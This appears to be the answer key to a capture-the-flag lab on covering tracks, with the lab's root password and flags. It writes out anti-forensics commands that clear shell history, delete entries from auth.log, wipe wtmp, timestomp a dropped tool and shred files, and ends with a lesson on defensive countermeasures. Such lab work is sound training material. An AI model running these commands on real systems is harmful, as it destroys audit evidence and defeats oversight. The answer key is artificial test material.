# Lab 11 — CTF Walkthrough (Answer Key)

## Starting flags

```bash
ssh root@10.10.11.10
# password: toor123
cat user.txt   # flag{lab11_root_access_given}
cat root.txt   # flag{lab11_full_control_granted}
```

## Generate evidence, then erase it

```bash
# From lab11-attacker
sshpass -p wrongpass ssh -o StrictHostKeyChecking=no root@10.10.11.10 whoami 2>&1 || true
ssh root@10.10.11.10
# ... do stuff, then:
exit
```

```bash
ssh root@10.10.11.10
unset HISTFILE
history -c
> ~/.bash_history

sed -i '/10.10.11.2/d' /var/log/auth.log

> /var/log/wtmp

touch -r /root/legit_reference.txt /root/dropped_tool.sh

echo "notes" > /root/scratch.txt
shred -u /root/scratch.txt

bash /root/verify.sh
```

## Bonus flag

If all four checks in `verify.sh` pass:

```
flag{lab11_covered_all_tracks}
```

## Lesson

Every single one of these techniques has a direct defensive countermeasure: centralized/remote logging (so a compromised host can't edit the copy that matters), file integrity monitoring (so timestomping and silent edits get flagged), and auditd rules that are harder to fully suppress than syslog. Covering tracks against a well-defended environment is much harder than against this lab's single local log file.
